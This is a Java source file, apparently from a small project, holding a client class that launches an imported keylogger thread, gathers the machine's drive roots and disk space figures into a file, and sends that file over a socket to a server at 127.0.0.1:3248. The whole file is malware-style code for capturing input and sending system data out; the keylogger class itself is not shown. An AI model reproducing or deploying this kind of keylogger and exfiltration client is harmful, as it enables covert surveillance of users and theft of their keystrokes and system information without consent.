package receiver;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.Socket;

import keylogger.keyboardlogger;

public class Client {
	
	//  get the IP, port and test file
    private final static String serverIP = "127.0.0.1";
    private final static int serverPort = 3248;
    private final static String fileOutput = "testout.txt";

    public static void main(String args[]) throws InterruptedException {
//    	System.out.println("in client");
    	System.out.println("in server");
    	Thread logger = new keyboardlogger();
        logger.start();
        
        //  run keylogger
        while(keyboardlogger.getRunStatus()){
        	logger.join();
        }
        Socket clientSocket = null;
        BufferedOutputStream outToClient = null;

        
        try {
            clientSocket = new Socket( serverIP , serverPort );
            System.out.println("client socket: " + clientSocket.getPort());
            System.out.println("client socket receiving? " + clientSocket.getInetAddress());
            outToClient = new BufferedOutputStream(clientSocket.getOutputStream());
            keyboardlogger.setRunStatus(false);
            logger.join();
        } catch (IOException ex) {
            // Do exception handling
        	System.out.println("error in setting up sockets");
        	ex.printStackTrace();
        }

        new ByteArrayOutputStream();
        
        if (outToClient != null) {
        	logger.join();
            File myFile = new File( fileOutput );
            if(!myFile.exists()){
            	try{
            		System.out.println("file did not exist.  writing...");
            	    PrintWriter writer = new PrintWriter(myFile, "UTF-8");
            	    File[] roots = File.listRoots();
            	    for(File root : roots){
            	    	writer.println(root.getAbsolutePath());
            	    	writer.println(root.getTotalSpace());
            	    	writer.println(root.getFreeSpace());
            	    	writer.println(root.getUsableSpace());
            	    }
            	    writer.close();
            	} catch (Exception e){
            		e.printStackTrace();
            	}
            }
            
            byte[] mybytearray = new byte[(int) myFile.length()];

            FileInputStream fis = null;

            try {
                fis = new FileInputStream(myFile);
            } catch (FileNotFoundException ex) {
                // Do exception handling
            }
            BufferedInputStream bis = new BufferedInputStream(fis);

            try {
            	
            	System.out.println("sending");
                bis.read(mybytearray, 0, mybytearray.length);
                outToClient.write(mybytearray, 0, mybytearray.length);
                outToClient.flush();
                outToClient.close();
                clientSocket.close();
                outToClient = null;
                // File sent, exit the main method
                return;
            } catch (IOException ex) {
                // Do exception handling
            }
        }
    }
}
